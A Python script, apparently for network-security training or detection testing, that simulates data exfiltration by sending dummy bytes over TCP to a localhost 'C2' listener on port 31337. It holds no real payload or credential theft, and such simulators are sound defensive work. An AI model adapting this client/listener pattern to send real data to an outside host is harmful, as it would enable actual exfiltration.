import socket
import time
import random
import argparse
import os

def simulate_exfil(dest_ip, dest_port, num_packets=5, packet_size=100):
    """
    Simulates a small data exfiltration attempt to a specified destination.
    This acts as the 'attacker' or compromised client.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5) # Set a timeout for connection
            print(f"[SIMULATOR] Attempting to connect to {dest_ip}:{dest_port}...")
            s.connect((dest_ip, dest_port))
            print("[SIMULATOR] Connection established. Sending data...")
            for i in range(num_packets):
                data = b'A' * packet_size + str(i).encode() # Simple dummy data
                s.sendall(data)
                print(f"[SIMULATOR] Sent {len(data)} bytes. Packet {i+1}/{num_packets}")
                time.sleep(random.uniform(0.1, 0.5)) # Small random delay to simulate varied traffic
            print("[SIMULATOR] Data transfer complete.")
    except socket.timeout:
        print("[SIMULATOR] Connection timed out. Is the listener running and accessible?")
    except ConnectionRefusedError:
        print(f"[SIMULATOR] Connection refused by {dest_ip}:{dest_port}. (Is a listener running on that IP/Port?)")
    except Exception as e:
        print(f"[SIMULATOR] An error occurred: {e}")

def simple_listener(listen_ip, listen_port):
    """
    A simple server that listens for incoming connections and prints received data.
    This acts as the 'malicious' command-and-control (C2) server.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Allow immediate reuse of address
        try:
            s.bind((listen_ip, listen_port))
            s.listen(1) # Listen for one incoming connection
            print(f"[LISTENER] Started on {listen_ip}:{listen_port}. Waiting for connections...")
            conn, addr = s.accept() # Accept an incoming connection
            with conn:
                print(f"[LISTENER] Connected by {addr}")
                while True:
                    data = conn.recv(1024) # Receive data in chunks
                    if not data: # If no more data, connection is closed
                        break
                    print(f"[LISTENER] Received: {data.decode(errors='ignore')}")
            print("[LISTENER] Connection closed by client.")
        except OSError as e:
            print(f"[LISTENER ERROR] Could not bind to {listen_ip}:{listen_port}. Is the port already in use? Error: {e}")
        except Exception as e:
            print(f"[LISTENER ERROR] An unexpected error occurred: {e}")

if __name__ == "__main__":
    # Set up argument parsing to choose between listener and simulator modes
    parser = argparse.ArgumentParser(description="Simple network attack simulator/listener.")
    parser.add_argument('--simulate', action='store_true', help='Run as attack simulator (client).')
    parser.add_argument('--listen', nargs=2, help='Run as listener (server) with IP and Port. Example: --listen 127.0.0.1 31337')
    args = parser.parse_args()

    if args.listen:
        # If --listen argument is provided, run the listener
        listen_ip, listen_port = args.listen[0], int(args.listen[1])
        simple_listener(listen_ip, listen_port)
    elif args.simulate:
        # If --simulate argument is provided, run the simulator
        # For this local demonstration, target is localhost.
        # In a real scenario, this would be a remote, suspicious IP.
        target_ip = "127.0.0.1"
        target_port = 31337      # Our chosen "unusual" port for the simulation
        simulate_exfil(target_ip, target_port)
    else:
        # If no valid arguments are provided, print usage instructions
        print("Please specify --simulate to run the attack, or --listen <IP> <Port> to run the listener.")
        print("Example to start listener: python3 network_attack_sim.py --listen 127.0.0.1 31337")
        print("Example to run simulator: python3 network_attack_sim.py --simulate")
